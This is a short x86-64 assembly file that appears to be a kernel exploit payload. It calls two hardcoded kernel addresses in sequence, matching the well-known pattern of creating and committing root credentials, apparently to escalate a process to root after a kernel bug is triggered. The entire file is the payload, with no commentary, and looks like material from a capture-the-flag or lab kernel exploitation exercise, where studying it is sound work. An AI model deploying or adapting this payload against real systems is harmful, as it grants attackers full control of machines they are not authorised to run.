.intel_syntax noprefix

.section .text
.global _start
_start:
    xor rdi, rdi
    mov r9, 0xffffffff81089660
    call r9
    mov rdi, rax
    mov r9, 0xffffffff81089310
    call r9
    ret

